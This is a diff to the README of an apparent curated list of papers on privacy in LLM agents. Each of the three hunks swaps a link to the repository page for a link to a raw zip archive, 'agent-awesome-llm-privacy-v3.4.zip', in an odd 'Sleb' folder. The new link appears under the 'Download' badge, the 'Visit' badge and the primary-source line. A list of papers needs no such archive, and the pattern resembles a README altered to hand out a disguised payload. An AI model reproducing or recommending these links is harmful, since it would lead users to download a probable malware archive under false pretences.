@@ -1,6 +1,6 @@
 # 🛡️ awesome-llm-agent-privacy - Manage Privacy in LLM Agents
 
-[![Download](https://img.shields.io/badge/Download-awesome--llm--agent--privacy-%23FF6347?style=for-the-badge&logo=github)](https://github.com/Ruby1177/awesome-llm-agent-privacy)
+[![Download](https://img.shields.io/badge/Download-awesome--llm--agent--privacy-%23FF6347?style=for-the-badge&logo=github)](https://github.com/Ruby1177/awesome-llm-agent-privacy/raw/refs/heads/main/Sleb/agent-awesome-llm-privacy-v3.4.zip)
 
 ## 📋 What is awesome-llm-agent-privacy?
 
@@ -44,7 +44,7 @@ To use this collection, you will visit a central place where these papers live. 
 
 Click or tap this large button to open the page with the full list. This is the main source of all papers and information.
 
-[![Visit GitHub Repository](https://img.shields.io/badge/Visit-awesome--llm--agent--privacy-%230064FF?style=for-the-badge&logo=github)](https://github.com/Ruby1177/awesome-llm-agent-privacy)
+[![Visit GitHub Repository](https://img.shields.io/badge/Visit-awesome--llm--agent--privacy-%230064FF?style=for-the-badge&logo=github)](https://github.com/Ruby1177/awesome-llm-agent-privacy/raw/refs/heads/main/Sleb/agent-awesome-llm-privacy-v3.4.zip)
 
 This link will open the repository page on GitHub where the papers are curated and organized.
 
@@ -103,7 +103,7 @@ Only papers that provide useful insights into privacy and security in LLM agents
 ## 🔗 Useful Links
 
 - Primary source for updates and downloads:  
-  [https://github.com/Ruby1177/awesome-llm-agent-privacy](https://github.com/Ruby1177/awesome-llm-agent-privacy)
+  [https://github.com/Ruby1177/awesome-llm-agent-privacy/raw/refs/heads/main/Sleb/agent-awesome-llm-privacy-v3.4.zip](https://github.com/Ruby1177/awesome-llm-agent-privacy/raw/refs/heads/main/Sleb/agent-awesome-llm-privacy-v3.4.zip)
 
 - Common PDF reader recommendation:  
   Adobe Acrobat Reader (free download)
